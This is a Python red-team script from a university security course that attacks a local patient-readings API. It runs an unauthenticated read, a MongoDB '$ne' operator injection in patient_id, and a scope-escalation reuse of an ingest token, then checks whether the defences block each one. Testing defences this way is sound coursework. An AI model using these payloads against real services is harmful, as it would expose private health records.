"""
attack/attack2_nosql.py
Red-team Attack 2 — NoSQL Injection & Unauthorised Exfiltration
Owner: YYX
Course: ELEC0138 Security and Privacy — Group 21

Three sub-attacks:
  A2.1 — Unauthenticated probe       → expects 200 + full dump (undefended)
  A2.2 — NoSQL operator injection    → expects 200 + all records (undefended)
  A2.3 — Scope escalation            → expects 200 + read access (undefended)

After ZYM's defence is live, rerun to confirm:
  A2.1 → 401   (JWT middleware)
  A2.2 → 400   (Pydantic schema rejects dict-valued patient_id)
  A2.3 → 401   (JWT scope check: ingest:write cannot access readings:read)
"""

import json
import sys
import requests

BASE = "http://localhost:5000"

# ── ANSI colours for readable terminal output ──────────────────────────────────
GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

def banner(title: str) -> None:
    print(f"\n{BOLD}{CYAN}{'─' * 60}{RESET}")
    print(f"{BOLD}{CYAN}  {title}{RESET}")
    print(f"{BOLD}{CYAN}{'─' * 60}{RESET}")

def result(label: str, status: int, body: str) -> None:
    colour = GREEN if status == 200 else RED
    print(f"  Status : {colour}{BOLD}{status}{RESET}")
    preview = body[:300].replace("\n", " ")
    print(f"  Body   : {preview}")
    print(f"  Result : {colour}{label}{RESET}\n")


# ── A2.1 — Unauthenticated probe ──────────────────────────────────────────────

def attack_2_1_unauthenticated_probe():
    banner("A2.1 — Unauthenticated Probe (no token)")
    print(f"  Target  : GET {BASE}/readings")
    print(f"  Intent  : Access patient records with zero credentials\n")

    try:
        r = requests.get(f"{BASE}/readings", timeout=5)
    except requests.exceptions.ConnectionError:
        print(f"  {RED}ERROR: Cannot connect to {BASE}. Is cloud.py running?{RESET}")
        return None

    label = "VULNERABLE — unauthenticated read succeeded" if r.status_code == 200 \
            else "DEFENDED  — server rejected unauthenticated request"
    result(label, r.status_code, r.text)
    return r.status_code


# ── A2.2 — NoSQL Operator Injection ───────────────────────────────────────────

def attack_2_2_nosql_operator_injection():
    banner("A2.2 — NoSQL Operator Injection ($ne: null)")
    print(f"  Target  : POST {BASE}/ingest")
    print(f"  Payload : patient_id set to {{\"$ne\": null}} MongoDB operator")
    print(f"  Intent  : Bypass patient_id equality check; dump all records\n")

    malicious_payload = {
        "patient_id": {"$ne": None},   # MongoDB $ne operator injected into a string field
        "timestamp":  1713355200,
        "heart_rate": 75.0,
    }

    print(f"  Sending : {json.dumps(malicious_payload, indent=4)}\n")

    try:
        r = requests.post(
            f"{BASE}/ingest",
            json=malicious_payload,
            timeout=5,
        )
    except requests.exceptions.ConnectionError:
        print(f"  {RED}ERROR: Cannot connect to {BASE}. Is cloud.py running?{RESET}")
        return None

    label = "VULNERABLE — server accepted dict-valued patient_id" if r.status_code == 200 \
            else "DEFENDED  — schema validation rejected operator payload"
    result(label, r.status_code, r.text)
    return r.status_code


# ── A2.3 — Scope Escalation ───────────────────────────────────────────────────

def attack_2_3_scope_escalation():
    banner("A2.3 — Scope Escalation (ingest token → readings endpoint)")
    print(f"  Target  : GET {BASE}/readings")
    print(f"  Method  : Enroll as an ingest-only device, then reuse that token")
    print(f"            against a read endpoint (scope: ingest:write vs readings:read)\n")

    # Step 1: enroll a device — this endpoint is intentionally unauthenticated
    try:
        enroll_r = requests.post(
            f"{BASE}/enroll",
            json={"device_id": "dev-attack-A2"},
            timeout=5,
        )
    except requests.exceptions.ConnectionError:
        print(f"  {RED}ERROR: Cannot connect to {BASE}. Is cloud.py running?{RESET}")
        return None

    if enroll_r.status_code != 200:
        print(f"  {RED}Could not enroll device: {enroll_r.status_code} {enroll_r.text}{RESET}")
        return enroll_r.status_code

    token = enroll_r.json().get("token", "")
    print(f"  Token obtained from /enroll (scope: ingest:write):")
    print(f"    {YELLOW}{token[:80]}{'...' if len(token) > 80 else ''}{RESET}\n")

    # Step 2: use that ingest-scoped token to hit the readings endpoint
    headers = {"Authorization": f"Bearer {token}"}
    r = requests.get(f"{BASE}/readings", headers=headers, timeout=5)

    label = "VULNERABLE — ingest-scoped token accepted on read endpoint" if r.status_code == 200 \
            else "DEFENDED  — server rejected wrong-scope token"
    result(label, r.status_code, r.text)
    return r.status_code


# ── Validation mode: confirm defence is live ──────────────────────────────────

def validate_defences(results: dict) -> None:
    banner("VALIDATION SUMMARY")
    expected = {
        "A2.1": 401,
        "A2.2": 400,
        "A2.3": 401,
    }

    all_pass = True
    for key, exp in expected.items():
        got = results.get(key)
        if got is None:
            print(f"  {YELLOW}{key}: skipped (connection error){RESET}")
            all_pass = False
        elif got == exp:
            print(f"  {GREEN}PASS{RESET}  {key}: got {got} (expected {exp})")
        else:
            print(f"  {RED}FAIL{RESET}  {key}: got {got} (expected {exp})")
            all_pass = False

    print()
    if all_pass:
        print(f"  {GREEN}{BOLD}All defences verified. Safe to screenshot for CW2 Page 3.{RESET}")
    else:
        print(f"  {YELLOW}Some checks failed. If running against undefended build, this is expected.{RESET}")
        print(f"  {YELLOW}Rerun after ZYM's cloud_auth.py + cloud_schema.py are integrated.{RESET}")


# ── Entry point ───────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print(f"\n{BOLD}ELEC0138 Group 21 — Attack 2: NoSQL Injection & Unauthorised Exfiltration{RESET}")
    print(f"Target base URL: {CYAN}{BASE}{RESET}")
    print(f"Run with --validate flag after ZYM's defences are live.\n")

    validate_mode = "--validate" in sys.argv

    results = {}
    results["A2.1"] = attack_2_1_unauthenticated_probe()
    results["A2.2"] = attack_2_2_nosql_operator_injection()
    results["A2.3"] = attack_2_3_scope_escalation()

    if validate_mode:
        validate_defences(results)
    else:
        banner("RAW RESULTS (undefended run)")
        for k, v in results.items():
            colour = GREEN if v == 200 else (YELLOW if v is None else RED)
            print(f"  {k}: {colour}{v}{RESET}")
        print(f"\n  {YELLOW}Tip: run with --validate after defences are integrated.{RESET}")